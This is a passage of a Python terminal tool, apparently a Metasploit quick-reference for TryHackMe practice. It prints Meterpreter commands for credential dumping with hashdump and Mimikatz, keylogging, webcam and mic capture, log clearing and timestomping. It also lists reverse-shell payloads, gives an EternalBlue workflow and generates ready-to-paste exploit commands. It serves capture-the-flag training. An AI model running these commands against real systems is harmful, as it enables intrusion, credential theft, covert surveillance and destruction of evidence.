        {'cmd': 'cd <path>', 'desc': 'Change directory', 'example': 'cd C:\\Users\\Administrator\\Desktop', 'output': 'Changed to C:\\Users\\Administrator\\Desktop'},
        {'cmd': 'pwd', 'desc': 'Print current working directory', 'example': 'pwd', 'output': 'C:\\Users\\Administrator'},
        {'cmd': 'cat <file>', 'desc': 'Display file contents', 'example': 'cat flag.txt', 'output': 'THM{you_got_the_flag}'},
        {'cmd': 'download <file>', 'desc': 'Download file from target to attacker', 'example': 'download flag.txt', 'output': 'Downloaded flag.txt to /root/'},
        {'cmd': 'upload <file>', 'desc': 'Upload file from attacker to target', 'example': 'upload shell.exe', 'output': 'Uploaded shell.exe'},
        {'cmd': 'search -f <name>', 'desc': 'Search for files on target', 'example': 'search -f flag.txt', 'output': 'Found 1 result: C:\\Users\\Admin\\Desktop\\flag.txt'},
        {'cmd': 'edit <file>', 'desc': 'Edit file on target', 'example': 'edit config.txt', 'output': 'Opens vim editor'},
    ],
    'credentials': [
        {'cmd': 'hashdump', 'desc': '💎 Dump Windows password hashes', 'example': 'hashdump', 'output': 'Administrator:500:aad3b...:31d6c...'},
        {'cmd': 'lsa_dump_sam', 'desc': 'Dump LSA secrets from SAM database', 'example': 'lsa_dump_sam', 'output': 'Dumping LSA secrets...'},
        {'cmd': 'lsa_dump_secrets', 'desc': 'Extract cached domain credentials', 'example': 'lsa_dump_secrets', 'output': 'Cached credentials found'},
        {'cmd': 'load kiwi', 'desc': '⭐ Load Mimikatz module', 'example': 'load kiwi', 'output': 'Loading kiwi...'},
        {'cmd': 'kiwi_cmd', 'desc': 'Run Mimikatz commands', 'example': 'kiwi_cmd sekurlsa::logonpasswords', 'output': 'Cleartext passwords'},
        {'cmd': 'creds_all', 'desc': 'Display all captured credentials', 'example': 'creds_all', 'output': 'host      user      pass'},
    ],
    'network': [
        {'cmd': 'ifconfig', 'desc': 'Show network interfaces', 'example': 'ifconfig', 'output': 'Interface 1: 192.168.1.100'},
        {'cmd': 'route', 'desc': 'Display routing table', 'example': 'route', 'output': 'Network routes...'},
        {'cmd': 'arp', 'desc': 'Show ARP cache', 'example': 'arp', 'output': 'IP address       HW address'},
        {'cmd': 'netstat', 'desc': 'Display network connections', 'example': 'netstat', 'output': 'Active connections'},
        {'cmd': 'portfwd add', 'desc': 'Forward port for pivoting', 'example': 'portfwd add -l 8080 -p 80 -r 192.168.1.10', 'output': 'Port forward created'},
    ],
    'surveillance': [
        {'cmd': 'keyscan_start', 'desc': '⌨️ Start keylogger', 'example': 'keyscan_start', 'output': 'Starting keylogger...'},
        {'cmd': 'keyscan_dump', 'desc': 'Dump captured keystrokes', 'example': 'keyscan_dump', 'output': 'password123'},
        {'cmd': 'keyscan_stop', 'desc': 'Stop keylogger', 'example': 'keyscan_stop', 'output': 'Stopping keylogger'},
        {'cmd': 'screenshot', 'desc': '📸 Take screenshot', 'example': 'screenshot', 'output': 'Screenshot saved to /root/...'},
        {'cmd': 'webcam_snap', 'desc': '📷 Take webcam photo', 'example': 'webcam_snap', 'output': 'Photo saved'},
        {'cmd': 'webcam_stream', 'desc': 'Stream webcam video', 'example': 'webcam_stream', 'output': 'Streaming...'},
        {'cmd': 'record_mic', 'desc': '🎤 Record microphone', 'example': 'record_mic -d 10', 'output': 'Recording for 10 seconds'},
    ],
    'process': [
        {'cmd': 'ps', 'desc': 'List processes', 'example': 'ps', 'output': 'PID   Name          User'},
        {'cmd': 'migrate <pid>', 'desc': '🎭 Migrate to another process (STEALTH!)', 'example': 'migrate 1234', 'output': 'Migration completed'},
        {'cmd': 'kill <pid>', 'desc': 'Kill process', 'example': 'kill 1234', 'output': 'Process killed'},
        {'cmd': 'execute', 'desc': 'Execute program on target', 'example': 'execute -f cmd.exe -H', 'output': 'Process created'},
    ],
    'privilege': [
        {'cmd': 'getsystem', 'desc': '⚡ Attempt privilege escalation to SYSTEM', 'example': 'getsystem', 'output': '...got system via technique 1'},
        {'cmd': 'getprivs', 'desc': 'Show current privileges', 'example': 'getprivs', 'output': 'Enabled Process Privileges'},
    ],
    'pivoting': [
        {'cmd': 'route add', 'desc': 'Add route for pivoting', 'example': 'route add 192.168.2.0 255.255.255.0 1', 'output': 'Route added'},
        {'cmd': 'autoroute', 'desc': 'Auto-configure routing', 'example': 'run autoroute -s 192.168.2.0/24', 'output': 'Route added'},
        {'cmd': 'portfwd', 'desc': 'Port forwarding', 'example': 'portfwd add -l 8080 -p 80 -r 192.168.2.10', 'output': 'Port forward created'},
    ],
    'stealth': [
        {'cmd': 'clearev', 'desc': '🧹 Clear Windows event logs', 'example': 'clearev', 'output': 'Clearing event logs...'},
        {'cmd': 'timestomp', 'desc': 'Change file timestamps', 'example': 'timestomp flag.txt -z "1999-01-01 00:00:00"', 'output': 'Timestamp modified'},
        {'cmd': 'migrate', 'desc': 'Hide in legitimate process', 'example': 'migrate 4567', 'output': 'Migrated to explorer.exe'},
    ],
    'session': [
        {'cmd': 'background', 'desc': 'Background current session (Ctrl+Z)', 'example': 'background', 'output': 'Backgrounding session 1...'},
        {'cmd': 'sessions', 'desc': 'List all sessions (from msfconsole)', 'example': 'sessions', 'output': 'Active sessions: 1'},
        {'cmd': 'sessions -i 1', 'desc': 'Interact with session 1', 'example': 'sessions -i 1', 'output': 'Starting interaction...'},
        {'cmd': 'exit', 'desc': 'Exit Meterpreter session', 'example': 'exit', 'output': 'Shutting down session'},
        {'cmd': 'shell', 'desc': '💻 Drop to system shell (cmd.exe/bash)', 'example': 'shell', 'output': 'C:\\Windows\\System32>'},
    ]
}

FLAG_HUNTING_WORKFLOW = f"""
{Colors.CYAN}╔════════════════════════════════════════════════════════════════════╗
║                  🚩 FLAG HUNTING WORKFLOW                          ║
╚════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.YELLOW}STEP 1: Know Your Situation{Colors.RESET}
  {Colors.GREEN}meterpreter >{Colors.RESET} getuid
  {Colors.GREEN}meterpreter >{Colors.RESET} sysinfo
  {Colors.MAGENTA}→ Identify OS, user privileges, hostname{Colors.RESET}

{Colors.YELLOW}STEP 2: Auto-Search for Flags{Colors.RESET}
  {Colors.GREEN}meterpreter >{Colors.RESET} search -f flag.txt
  {Colors.GREEN}meterpreter >{Colors.RESET} search -f user.txt
  {Colors.GREEN}meterpreter >{Colors.RESET} search -f root.txt
  {Colors.MAGENTA}→ Let Meterpreter find flags automatically!{Colors.RESET}

{Colors.YELLOW}STEP 3: Check Common Locations (if auto-search fails){Colors.RESET}
  
  {Colors.CYAN}Windows:{Colors.RESET}
    {Colors.GREEN}meterpreter >{Colors.RESET} cd C:\\Users\\Administrator\\Desktop
    {Colors.GREEN}meterpreter >{Colors.RESET} ls
    {Colors.GREEN}meterpreter >{Colors.RESET} cd C:\\Users\\[username]\\Desktop
    {Colors.GREEN}meterpreter >{Colors.RESET} cd C:\\
  
  {Colors.CYAN}Linux:{Colors.RESET}
    {Colors.GREEN}meterpreter >{Colors.RESET} cd /root
    {Colors.GREEN}meterpreter >{Colors.RESET} ls
    {Colors.GREEN}meterpreter >{Colors.RESET} cd /home/[username]
    {Colors.GREEN}meterpreter >{Colors.RESET} cd /var/www/html

{Colors.YELLOW}STEP 4: Manual Deep Search (drop to system shell){Colors.RESET}
  {Colors.GREEN}meterpreter >{Colors.RESET} shell
  
  {Colors.CYAN}Windows:{Colors.RESET}
    {Colors.WHITE}C:\\>{Colors.RESET} dir /s /b flag.txt
    {Colors.WHITE}C:\\>{Colors.RESET} dir /s /b user.txt
    {Colors.WHITE}C:\\>{Colors.RESET} dir /s /b *.txt
  
  {Colors.CYAN}Linux:{Colors.RESET}
    {Colors.WHITE}${Colors.RESET} find / -name flag.txt 2>/dev/null
    {Colors.WHITE}${Colors.RESET} find / -name user.txt 2>/dev/null
    {Colors.WHITE}${Colors.RESET} find / -type f -name "*.txt" 2>/dev/null

{Colors.YELLOW}STEP 5: Read the Flag{Colors.RESET}
  {Colors.GREEN}meterpreter >{Colors.RESET} cat C:\\Users\\Admin\\Desktop\\flag.txt
  {Colors.GREEN}OR{Colors.RESET}
  {Colors.GREEN}meterpreter >{Colors.RESET} download flag.txt
  
  {Colors.MAGENTA}→ Copy flag, submit to TryHackMe!{Colors.RESET}

{Colors.YELLOW}BONUS: If You Need Higher Privileges{Colors.RESET}
  {Colors.GREEN}meterpreter >{Colors.RESET} getsystem
  {Colors.MAGENTA}→ Try to escalate to SYSTEM/root{Colors.RESET}
  {Colors.GREEN}meterpreter >{Colors.RESET} getuid
  {Colors.MAGENTA}→ Verify escalation worked{Colors.RESET}

{Colors.GREEN}💡 PRO TIP: search -f flag.txt works 90% of the time!{Colors.RESET}
"""

PAYLOADS = {
    'windows_reverse_tcp': {
        'path': 'windows/meterpreter/reverse_tcp',
        'description': 'Standard Windows Meterpreter reverse shell',
        'stability': '★★★★★',
        'use': 'Most Windows exploits'
    },
    'windows_x64_reverse_tcp': {
        'path': 'windows/x64/meterpreter/reverse_tcp',
        'description': '64-bit Windows Meterpreter reverse shell',
        'stability': '★★★★★',
        'use': 'Modern 64-bit Windows systems'
    },
    'linux_reverse_tcp': {
        'path': 'linux/x86/meterpreter/reverse_tcp',
        'description': '32-bit Linux Meterpreter reverse shell',
        'stability': '★★★★☆',
        'use': 'Older Linux systems'
    },
    'linux_x64_reverse_tcp': {
        'path': 'linux/x64/meterpreter/reverse_tcp',
        'description': '64-bit Linux Meterpreter reverse shell',
        'stability': '★★★★★',
        'use': 'Modern 64-bit Linux systems'
    },
    'cmd_unix_reverse': {
        'path': 'cmd/unix/reverse',
        'description': 'Basic Unix command shell (no Meterpreter)',
        'stability': '★★★★★',
        'use': 'When Meterpreter fails or for simplicity'
    },
    'php_reverse_tcp': {
        'path': 'php/meterpreter/reverse_tcp',
        'description': 'PHP Meterpreter reverse shell',
        'stability': '★★★★☆',
        'use': 'Web applications running PHP'
    },
    'java_reverse_tcp': {
        'path': 'java/meterpreter/reverse_tcp',
        'description': 'Java Meterpreter reverse shell',
        'stability': '★★★★☆',
        'use': 'Java applications (Tomcat, Jenkins, etc.)'
    }
}

def show_main_menu():
    print(f"\n{Colors.CYAN}╔════════════════════════════════════════╗")
    print(f"║           MAIN MENU                    ║")
    print(f"╚════════════════════════════════════════╝{Colors.RESET}\n")
    print(f"{Colors.GREEN}[1]{Colors.RESET} 🔍 Search Exploits")
    print(f"{Colors.GREEN}[2]{Colors.RESET} Browse Exploits by Category")
    print(f"{Colors.GREEN}[3]{Colors.RESET} View Top 10 Exploits")
    print(f"{Colors.GREEN}[4]{Colors.RESET} View Payloads Reference")
    print(f"{Colors.GREEN}[5]{Colors.RESET} Generate MSF Command")
    print(f"{Colors.CYAN}[6]{Colors.RESET} 🔦 Auxiliary Modules")
    print(f"{Colors.MAGENTA}[7]{Colors.RESET} 🎮 Meterpreter Commands")
    print(f"{Colors.GREEN}[8]{Colors.RESET} Exit")
    print()

def display_exploit(key, exploit, show_details=True):
    print(f"{Colors.BOLD}{Colors.GREEN}[{exploit['rank']}]{Colors.RESET} {Colors.BOLD}{exploit['name']}{Colors.RESET}")
    print(f"{Colors.CYAN}Path:{Colors.RESET} {exploit['path']}")
    print(f"{Colors.CYAN}Port:{Colors.RESET} {exploit['port']}")
    print(f"{Colors.CYAN}Target:{Colors.RESET} {exploit['target']}")
    
    if show_details:
        print(f"{Colors.MAGENTA}🎯 When to Use:{Colors.RESET} {Colors.BOLD}{exploit['purpose']}{Colors.RESET}")
        if 'recon_first' in exploit:
            print(f"{Colors.BLUE}🔍 Check First:{Colors.RESET} {Colors.BOLD}{exploit['recon_first']}{Colors.RESET}")
        print(f"{Colors.CYAN}Description:{Colors.RESET} {exploit['description']}")
        print(f"{Colors.CYAN}Payload:{Colors.RESET} {exploit['payload']}")
        if 'after_shell' in exploit:
            print(f"{Colors.GREEN}🚩 After Entry:{Colors.RESET} {Colors.BOLD}{exploit['after_shell']}{Colors.RESET}")
        print(f"{Colors.YELLOW}Notes:{Colors.RESET} {exploit['notes']}")

def display_auxiliary(aux):
    print(f"{Colors.BOLD}{Colors.CYAN}{aux['name']}{Colors.RESET}")
    print(f"{Colors.GREEN}Path:{Colors.RESET} {aux['path']}")
    print(f"{Colors.MAGENTA}Purpose:{Colors.RESET} {aux['purpose']}")
    print(f"{Colors.YELLOW}Use Case:{Colors.RESET} {aux['use_case']}")
    print(f"{Colors.BLUE}Options:{Colors.RESET} {aux['common_options']}")
    print(f"{Colors.CYAN}Example:{Colors.RESET}")
    print(f"{Colors.WHITE}  use {aux['path']}")
    for line in aux['example'].split('\n'):
        print(f"{Colors.WHITE}  {line}")
    print(f"{Colors.YELLOW}💡 Notes:{Colors.RESET} {aux['notes']}")

def search_exploits(query):
    query = query.lower()
    results = []
    for key, exploit in EXPLOITS.items():
        if (query in exploit['name'].lower() or query in exploit['path'].lower() or 
            query in exploit['description'].lower() or query in exploit['target'].lower()):
            results.append((key, exploit))
    
    if not results:
        print(f"\n{Colors.RED}No exploits found matching '{query}'{Colors.RESET}")
        return
    
    print(f"\n{Colors.CYAN}╔════════════════════════════════════════════════════════════════════╗")
    print(f"║  Found {len(results)} exploit(s) matching '{query}'")
    print(f"╚════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    for key, exploit in results:
        display_exploit(key, exploit)
        print(f"{Colors.YELLOW}{'─' * 70}{Colors.RESET}\n")

def browse_by_category():
    categories = {}
    for key, exploit in EXPLOITS.items():
        cat = exploit['category']
        if cat not in categories:
            categories[cat] = []
        categories[cat].append((key, exploit))
    
    print(f"\n{Colors.CYAN}╔════════════════════════════════════════╗")
    print(f"║        EXPLOIT CATEGORIES              ║")
    print(f"╚════════════════════════════════════════╝{Colors.RESET}\n")
    
    for i, cat in enumerate(sorted(categories.keys()), 1):
        count = len(categories[cat])
        print(f"{Colors.GREEN}[{i}]{Colors.RESET} {cat.upper()} ({count} exploits)")
    print(f"{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu")
    
    choice = input(f"\n{Colors.YELLOW}Select category: {Colors.RESET}").strip()
    if choice == '0':
        return
    
    try:
        choice_num = int(choice) - 1
        selected_cat = sorted(categories.keys())[choice_num]
        print(f"\n{Colors.CYAN}╔════════════════════════════════════════════════════════════════════╗")
        print(f"║  Category: {selected_cat.upper()}")
        print(f"╚════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
        for key, exploit in categories[selected_cat]:
            display_exploit(key, exploit)
            print(f"{Colors.YELLOW}{'─' * 70}{Colors.RESET}\n")
    except (ValueError, IndexError):
        print(f"{Colors.RED}Invalid selection{Colors.RESET}")

def show_top_10():
    top_exploits = ['ms17_010', 'samba_usermap', 'vsftpd_234', 'shellshock',
                    'drupal_drupalgeddon', 'psexec', 'unreal_ircd', 'distcc',
                    'tomcat_mgr', 'rejetto_hfs']
    
    print(f"\n{Colors.CYAN}╔════════════════════════════════════════════════════════════════════╗")
    print(f"║           TOP 10 EXPLOITS FOR TRYHACKME                            ║")
    print(f"╚════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    for i, key in enumerate(top_exploits, 1):
        exploit = EXPLOITS[key]
        print(f"{Colors.BOLD}{Colors.YELLOW}#{i}{Colors.RESET} ", end='')
        display_exploit(key, exploit, show_details=False)
        print(f"{Colors.MAGENTA}Quick Use:{Colors.RESET} use {exploit['path']}")
        print(f"{Colors.YELLOW}{'─' * 70}{Colors.RESET}\n")

def show_payloads():
    print(f"\n{Colors.CYAN}╔════════════════════════════════════════════════════════════════════╗")
    print(f"║                    PAYLOAD REFERENCE                               ║")
    print(f"╚════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    for name, payload in PAYLOADS.items():
        print(f"{Colors.BOLD}{Colors.GREEN}{name.replace('_', ' ').title()}{Colors.RESET}")
        print(f"{Colors.CYAN}Path:{Colors.RESET} {payload['path']}")
        print(f"{Colors.CYAN}Description:{Colors.RESET} {payload['description']}")
        print(f"{Colors.CYAN}Stability:{Colors.RESET} {payload['stability']}")
        print(f"{Colors.YELLOW}Use Case:{Colors.RESET} {payload['use']}")
        print(f"{Colors.YELLOW}{'─' * 70}{Colors.RESET}\n")

def browse_auxiliary():
    print(f"\n{Colors.CYAN}╔════════════════════════════════════════════════════════════════════╗")
    print(f"║              🔦 AUXILIARY MODULES - RECONNAISSANCE                 ║")
    print(f"╚════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}Choose attack phase:{Colors.RESET}\n")
    print(f"{Colors.GREEN}[1]{Colors.RESET} 🔍 Scanners (Port, Service, Version Detection)")
    print(f"{Colors.GREEN}[2]{Colors.RESET} 📋 Enumeration (Users, Shares, Directories)")
    print(f"{Colors.GREEN}[3]{Colors.RESET} 💥 Brute Force (SSH, FTP, SMB, HTTP)")
    print(f"{Colors.GREEN}[4]{Colors.RESET} 🎯 Gathering (Post-Exploit Credential Theft)")
    print(f"{Colors.GREEN}[5]{Colors.RESET} 📖 Complete Workflow Example")
    print(f"{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu")
    
    choice = input(f"\n{Colors.YELLOW}Select category (0-5): {Colors.RESET}").strip()
    
    if choice == '0':
        return
    elif choice == '1':
        show_auxiliary_category('scanners', 'SCANNERS - RECONNAISSANCE')
    elif choice == '2':
        show_auxiliary_category('enumeration', 'ENUMERATION - INFORMATION GATHERING')
    elif choice == '3':
        show_auxiliary_category('brute_force', 'BRUTE FORCE - PASSWORD ATTACKS')
    elif choice == '4':
        show_auxiliary_category('gathering', 'GATHERING - POST-EXPLOITATION')
    elif choice == '5':
        show_workflow_example()
    else:
        print(f"{Colors.RED}Invalid selection{Colors.RESET}")

def show_auxiliary_category(category, title):
    print(f"\n{Colors.CYAN}╔════════════════════════════════════════════════════════════════════╗")
    print(f"║  {title}")
    print(f"╚════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    for i, aux in enumerate(AUXILIARY[category], 1):
        print(f"{Colors.BOLD}[{i}] {Colors.CYAN}{aux['name']}{Colors.RESET}")
        display_auxiliary(aux)
        print(f"{Colors.YELLOW}{'─' * 70}{Colors.RESET}\n")

def show_workflow_example():
    workflow = f"""
{Colors.CYAN}╔════════════════════════════════════════════════════════════════════╗
║         COMPLETE PENTESTING WORKFLOW - WINDOWS TARGET                 ║
╚════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.YELLOW}PHASE 1: RECONNAISSANCE (Scanners){Colors.RESET}
{Colors.GREEN}1.{Colors.RESET} Port Scan
   use auxiliary/scanner/portscan/tcp
   set RHOSTS 10.10.x.x
   run

{Colors.GREEN}2.{Colors.RESET} SMB Version Detection  
   use auxiliary/scanner/smb/smb_version
   set RHOSTS 10.10.x.x
   run

{Colors.YELLOW}PHASE 2: ENUMERATION{Colors.RESET}
{Colors.GREEN}3.{Colors.RESET} Enumerate SMB Shares
   use auxiliary/scanner/smb/smb_enumshares
   set RHOSTS 10.10.x.x
   run

{Colors.GREEN}4.{Colors.RESET} Enumerate Users
   use auxiliary/scanner/smb/smb_enumusers
   set RHOSTS 10.10.x.x
   run

{Colors.YELLOW}PHASE 3: EXPLOITATION{Colors.RESET}
{Colors.GREEN}5.{Colors.RESET} Exploit SMB (if vulnerable)
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS 10.10.x.x
   set LHOST tun0
   exploit

{Colors.YELLOW}PHASE 4: POST-EXPLOITATION (Gathering){Colors.RESET}
{Colors.GREEN}6.{Colors.RESET} Dump Password Hashes
   meterpreter > hashdump

{Colors.GREEN}7.{Colors.RESET} Gather Stored Credentials
   background
   use auxiliary/gather/credentials/windows/credentials_collector
   set SESSION 1
   run

{Colors.YELLOW}PHASE 5: PRIVILEGE ESCALATION{Colors.RESET}
{Colors.GREEN}8.{Colors.RESET} Escalate if needed
   sessions -i 1
   meterpreter > getsystem

{Colors.GREEN}SUCCESS!{Colors.RESET} You now have SYSTEM access + credentials + full control!

{Colors.MAGENTA}💡 This workflow applies to 90% of TryHackMe Windows rooms!{Colors.RESET}
"""
    print(workflow)

def browse_meterpreter():
    print(f"\n{Colors.CYAN}╔════════════════════════════════════════════════════════════════════╗")
    print(f"║              🎮 METERPRETER POST-EXPLOITATION COMMANDS             ║")
    print(f"╚════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}Choose category:{Colors.RESET}\n")
    print(f"{Colors.GREEN}[1]{Colors.RESET} 🔍 System Reconnaissance")
    print(f"{Colors.GREEN}[2]{Colors.RESET} 📁 File Operations")
    print(f"{Colors.GREEN}[3]{Colors.RESET} 🔐 Credential Harvesting ⭐")
    print(f"{Colors.GREEN}[4]{Colors.RESET} 🌐 Network Commands")
    print(f"{Colors.GREEN}[5]{Colors.RESET} 👁️ Surveillance (Keylogger, Screenshot, Webcam)")
    print(f"{Colors.GREEN}[6]{Colors.RESET} 🔄 Process Management")
    print(f"{Colors.GREEN}[7]{Colors.RESET} ⚡ Privilege Escalation")
    print(f"{Colors.GREEN}[8]{Colors.RESET} 🔁 Pivoting & Lateral Movement")
    print(f"{Colors.GREEN}[9]{Colors.RESET} 🎭 Stealth & Cleanup")
    print(f"{Colors.GREEN}[10]{Colors.RESET} 📊 Session Management")
    print(f"{Colors.MAGENTA}[11]{Colors.RESET} 🚩 FLAG HUNTING WORKFLOW ⭐⭐⭐")
    print(f"{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu")
    
    choice = input(f"\n{Colors.YELLOW}Select category (0-11): {Colors.RESET}").strip()
    
    categories = {
        '1': ('recon', 'SYSTEM RECONNAISSANCE'),
        '2': ('files', 'FILE OPERATIONS'),
        '3': ('credentials', 'CREDENTIAL HARVESTING 💎'),
        '4': ('network', 'NETWORK COMMANDS'),
        '5': ('surveillance', 'SURVEILLANCE'),
        '6': ('process', 'PROCESS MANAGEMENT'),
        '7': ('privilege', 'PRIVILEGE ESCALATION'),
        '8': ('pivoting', 'PIVOTING & LATERAL MOVEMENT'),
        '9': ('stealth', 'STEALTH & CLEANUP'),
        '10': ('session', 'SESSION MANAGEMENT')
    }
    
    if choice == '0':
        return
    elif choice == '11':
        print(FLAG_HUNTING_WORKFLOW)
    elif choice in categories:
        category, title = categories[choice]
        show_meterpreter_category(category, title)
    else:
        print(f"{Colors.RED}Invalid selection{Colors.RESET}")

def show_meterpreter_category(category, title):
    print(f"\n{Colors.CYAN}╔════════════════════════════════════════════════════════════════════╗")
    print(f"║  {title}")
    print(f"╚════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    for cmd_info in METERPRETER_COMMANDS[category]:
        print(f"{Colors.BOLD}{Colors.GREEN}Command:{Colors.RESET} {Colors.CYAN}{cmd_info['cmd']}{Colors.RESET}")
        print(f"{Colors.YELLOW}Purpose:{Colors.RESET} {cmd_info['desc']}")
        print(f"{Colors.MAGENTA}Example:{Colors.RESET}")
        print(f"  {Colors.WHITE}meterpreter > {cmd_info['example']}{Colors.RESET}")
        print(f"{Colors.BLUE}Output:{Colors.RESET} {cmd_info['output']}")
        print(f"{Colors.YELLOW}{'─' * 70}{Colors.RESET}\n")

def generate_command():
    print(f"\n{Colors.CYAN}╔════════════════════════════════════════╗")
    print(f"║      GENERATE MSF COMMAND              ║")
    print(f"╚════════════════════════════════════════╝{Colors.RESET}\n")
    
    search_term = input(f"{Colors.YELLOW}Enter exploit name or search term: {Colors.RESET}").strip()
    
    matches = []
    for key, exploit in EXPLOITS.items():
        if search_term.lower() in exploit['name'].lower() or search_term.lower() in key:
            matches.append((key, exploit))
    
    if not matches:
        print(f"{Colors.RED}No matching exploit found{Colors.RESET}")
        return
    
    if len(matches) > 1:
        print(f"\n{Colors.YELLOW}Multiple matches found:{Colors.RESET}\n")
        for i, (key, exploit) in enumerate(matches, 1):
            print(f"{Colors.GREEN}[{i}]{Colors.RESET} {exploit['name']}")
        
        choice = input(f"\n{Colors.YELLOW}Select exploit (1-{len(matches)}): {Colors.RESET}").strip()
        try:
            selected = matches[int(choice) - 1]
        except (ValueError, IndexError):
            print(f"{Colors.RED}Invalid selection{Colors.RESET}")
            return
    else:
        selected = matches[0]
    
    key, exploit = selected
    target_ip = input(f"{Colors.YELLOW}Target IP (RHOSTS): {Colors.RESET}").strip() or "10.10.10.1"
    lhost = input(f"{Colors.YELLOW}Your IP (LHOST, default: tun0): {Colors.RESET}").strip() or "tun0"
    lport = input(f"{Colors.YELLOW}Your Port (LPORT, default: 4444): {Colors.RESET}").strip() or "4444"
    
    print(f"\n{Colors.GREEN}{'═' * 70}")
    print(f"  COPY AND PASTE INTO MSFCONSOLE")
    print(f"{'═' * 70}{Colors.RESET}\n")
    
    commands = f"""use {exploit['path']}
set RHOSTS {target_ip}
set LHOST {lhost}
set LPORT {lport}"""
    
    if exploit['payload'] != 'N/A (auxiliary)':
        commands += f"\nset PAYLOAD {exploit['payload']}"
    
    commands += "\ncheck\nexploit"
    
    print(f"{Colors.CYAN}{commands}{Colors.RESET}\n")
    print(f"{Colors.GREEN}{'═' * 70}{Colors.RESET}")
    print(f"{Colors.YELLOW}💡 Tip: Copy the commands above and paste into msfconsole{Colors.RESET}\n")

def main():
    print_banner()
    
    while True:
        show_main_menu()
        choice = input(f"{Colors.YELLOW}Select option (1-8): {Colors.RESET}").strip()
        
        if choice == '1':
            query = input(f"\n{Colors.YELLOW}Enter search term: {Colors.RESET}").strip()
            if query:
                search_exploits(query)
            else:
                print(f"{Colors.RED}Please enter a search term{Colors.RESET}")
        elif choice == '2':
            browse_by_category()
        elif choice == '3':
            show_top_10()
        elif choice == '4':
            show_payloads()
        elif choice == '5':
            generate_command()
        elif choice == '6':
            browse_auxiliary()
        elif choice == '7':
            browse_meterpreter()
        elif choice == '8':
            print(f"\n{Colors.YELLOW}{'═' * 70}")
            print(f"  Thanks for using MSF-QUICK V5.0!")
            print(f"  Keep hacking! #ZuciyaZaki! 🦁")
            print(f"  \"I never go back on my word - that's my ninja way!\"")
            print(f"{'═' * 70}{Colors.RESET}\n")
            sys.exit(0)
        else:
            print(f"{Colors.RED}Invalid option. Please select 1-8{Colors.RESET}")
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
        os.system('clear' if os.name == 'posix' else 'cls')
        print_banner()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Exiting... You WILL make it happen, BELIEVE IT! 🦁{Colors.RESET}\n")
        sys.exit(0)